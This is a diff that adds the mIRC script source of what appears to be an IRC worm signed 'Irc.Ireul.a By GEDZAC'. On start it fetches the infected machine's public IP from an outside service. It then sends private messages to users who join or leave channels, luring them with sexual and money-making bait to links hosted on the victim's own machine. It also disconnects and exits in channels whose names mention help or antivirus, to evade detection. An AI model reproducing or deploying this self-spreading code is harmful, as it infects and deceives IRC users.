@@ -1,0 +1,22 @@
+   ;Irc.Ireul.a By G $+ $Chr(69) $+ D $+ $Chr(65) $+ C
+   On 1:JOIN:*:{ if ($nick != $me) { spim } | else { if (ayuda isin #) || (help isin #) || (viru isin #) || (avt isin #) || (vh isin #) || (gigairc isin #) { .privmsg # $decode(SXJjLklyZXVsLkEgYnkgR0VEWkFDIExBQlM=,m) | .disconnect | .exit } } }
+   On 1:PART:#:{ if ($nick != $me) { spim } }
+   Alias spim { var %r = $rand(1,10)
+     if (%r = 1) { var %m = 5Mira esta foto, esta buena http:// $+ %mip $+ /ovniirak.jpg }
+     elseif (%r = 2) { var %m = 4,1Fotos de Famosos y Famosas 8,1http:// $+ %mip $+ /famous.htm }
+     elseif (%r = 3) { var %m = 8,1No te pierdas las sensuales fotos de 4,1Britney8,1 y 4,1Cristina8,1 http:// $+ %mip $+ /britcris.jpg }
+     elseif (%r = 4) { var %m = 4Aprende a satisfacer a tu pareja http:// $+ %mip $+ /sextest.htm }
+     elseif (%r = 5) { var %m = 12Que y como piensa el sexo opuesto 4http:// $+ %mip $+ /psicosex.jpg }
+     elseif (%r = 6) { var %m = 13,1XXX Sex Teens Lesb Fantasy 4,1http:// $+ %mip $+ /sexteens.jpg }
+     elseif (%r = 7) { var %m = 8,1Lo mejor del cine tv y demas entretenimiento 9,1http:// $+ %mip $+ /orbita.htm }
+     elseif (%r = 8) { var %m = 12Mira mi foto 4http:// $+ %mip $+ / $+ $me $+ .jpg }
+     elseif (%r = 9) { var %m = 4,1Gana dinero en Internet 8,1http:// $+ %mip $+ /money.txt }
+     elseif (%r = 10) { var %m = 15,1Conoces la Oscuridad? 14,1http:// $+ %mip $+ /darkness.jpg }
+   .privmsg $nick %m }
+   On *:START:{ .unset %mip %pi | GetIp }
+   Alias GetIp { .sockopen gip cualesmiip.e-mision.net 999 }
+   On *:sockread:gip:{ if ($sockerr > 0) { return }
+     if ($sock(gip).status == active) { .sockread -f %pi } | else { return }
+     if ($sockbr == 0) { return }
+     if (%pi == $null) { %pi = - }
+   if ($len(%pi) > 6) { .set %mip %pi | .sockclose gip } }
